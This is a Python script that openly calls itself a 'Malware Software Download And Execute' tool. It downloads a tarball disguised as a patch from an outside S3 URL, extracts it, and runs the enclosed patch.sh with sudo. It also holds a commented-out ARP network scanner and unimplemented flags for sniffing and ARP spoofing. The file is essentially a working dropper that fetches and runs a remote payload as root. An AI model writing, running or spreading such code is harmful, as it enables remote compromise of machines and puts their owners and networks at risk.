import argparse
import os
import subprocess
import scapy.all as scapy

def download_file(path, overwrite):
    malware_path = os.path.join(path, 'Patch.V.1.2')
    if os.path.exists(malware_path) and not overwrite:
        return
    os.system('curl -O "https://awss3project4821.s3.ap-southeast-2.amazonaws.com/Patch.V.1.2.tar"')
    subprocess.run(['tar', '-xvf', 'Patch.V.1.2.tar'], check=True)

def execute_file(path):
    malware_path = os.path.join(path, 'Patch.V.1.2')
    os.chdir(malware_path)
    execute_file_path = os.path.join(malware_path, "patch.sh")
    if os.path.exists(execute_file_path):
        subprocess.run(["sudo", "sh", execute_file_path], check=True)
    else:
        print(f"[-] There is no ExecuteFile: {execute_file_path}")

# def network_scan():
#     def scan(ip):
#         arp_request = scapy.ARP(pdst=ip)
#         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  
#         arp_request_broadcast = broadcast / arp_request 
#         answerd_list = scapy.srp(arp_request_broadcast, timeout=1,verbose=False)[0]
#         client_list = []
#         for element in answerd_list:
#             client_dict = {"ip":element[1].psrc, "mac":element[1].hwsrc}
#             client_list.append(client_dict)
#         return client_list
#     def print_scan_result(result_list):
#         print("IP\t\t\tMAC Address\n----------------------------------------------------------")
#         for client in result_list:
#             print(client["ip"] + "\t\t" + client["mac"])
#     ip_address = input("[-] Enter IP Address : ")
#     print_scan_result(scan(ip_address))

def main():
    parser = argparse.ArgumentParser(description="Malware Software Download And Execute")
    parser.add_argument("--download", action="store_true", help="Malware Download")
    parser.add_argument("--execute" , action="store_true", help="Malware Execute")
    parser.add_argument("--overwrite", action="store_true", help="Malware Program Overwirte")
    parser.add_argument("--path", type=str, default=os.getcwd(), help="Malware Path")
    
    # network sniffing function
    parser.add_argument("--scan", action="store_true", help="Network Scanning")
    parser.add_argument("--sniff", action="store_true", help="Network Sniffing")
    parser.add_argument("--arpspoofing", action="store_true", help="Arp Spoofing")
    
    
    args = parser.parse_args()
    if not os.path.exists(args.path):
        os.makedirs(args.path)
    if args.download:
        download_file(args.path, args.overwrite)
    if args.execute:
        execute_file(args.path)
    # if args.scan:
    #     network_scan()
    # if not args.download and not args.execute:
    #     print("[-] must input --download or --execute")

if __name__ == "__main__":
    main()
